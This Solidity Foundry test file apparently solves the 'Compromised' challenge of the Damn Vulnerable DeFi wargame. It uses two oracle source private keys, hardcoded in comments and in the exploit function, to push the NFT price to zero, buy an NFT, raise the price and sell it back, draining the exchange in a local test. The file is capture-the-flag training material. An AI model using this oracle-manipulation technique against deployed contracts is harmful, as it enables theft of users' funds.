// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import "../../src/compromised/Exchange.sol";
import "../../src/DamnValuableNFT.sol";
import "../../src/compromised/TrustfulOracleInitializer.sol";
import "../../src/compromised/TrustfulOracle.sol";

contract CompromisedTest is Test {
    address public deployer;
    address public player;
    address[] public sources;

    TrustfulOracleInitializer public initializer;
    TrustfulOracle public oracle;
    Exchange public exchange;
    DamnValuableNFT public nftToken;

    uint256 public constant EXCHANGE_INITIAL_ETH_BALANCE = 999e18;
    uint256 public constant INITIAL_NFT_PRICE = 999e18;
    uint256 public constant PLAYER_INITIAL_ETH_BALANCE = 1e17;
    uint256 public constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2e18;

    function setUp() public {
        deployer = makeAddr("deployer");
        player = makeAddr("player");
        sources = [
            0xA73209FB1a42495120166736362A1DfA9F95A105,
            0xe92401A4d3af5E446d93D11EEc806b1462b39D15, // pk 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
            0x81A5D6E50C214044bE44cA0CB057fe119097850c // pk 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
        ];
        vm.startPrank(deployer);
        vm.deal(deployer, EXCHANGE_INITIAL_ETH_BALANCE);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            assertEq(address(sources[i]).balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(address(player).balance, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        string[] memory symbols = new string[](3);
        symbols[0] = "DVNFT";
        symbols[1] = "DVNFT";
        symbols[2] = "DVNFT";
        uint256[] memory initialPrices = new uint256[](3);
        initialPrices[0] = INITIAL_NFT_PRICE;
        initialPrices[1] = INITIAL_NFT_PRICE;
        initialPrices[2] = INITIAL_NFT_PRICE;

        oracle = new TrustfulOracleInitializer(sources, symbols, initialPrices).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));

        nftToken = exchange.token();
        assertEq(nftToken.owner(), address(0));
        assertEq(nftToken.rolesOf(address(exchange)), nftToken.MINTER_ROLE());
        vm.stopPrank();
    }

    function exploit() public {
        uint256[2] memory keys = [
            0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9,
            0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
        ];
        exploitPrice(keys, 0);

        vm.startPrank(player);
        uint256 id = exchange.buyOne{value: 1e17}();
        vm.stopPrank();

        exploitPrice(keys, 999e18);

        vm.startPrank(player);
        nftToken.approve(address(exchange), id);
        exchange.sellOne(id);
        vm.stopPrank();
    }

    function exploitPrice(uint256[2] memory _keys, uint256 _price) public {
        for (uint256 i = 0; i < _keys.length; i++) {
            address addr = vm.addr(_keys[i]);
            vm.startPrank(addr);
            oracle.postPrice("DVNFT", _price);
            vm.stopPrank();
        }
    }

    function test_exploit() public {
        exploit();

        // Exchange must have lost all ETH
        assertEq(address(exchange).balance, 0);

        // Player's ETH balance must have significantly increased
        assertGt(address(player).balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nftToken.balanceOf(player), 0);

        // NFT price shouldn't have changed
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
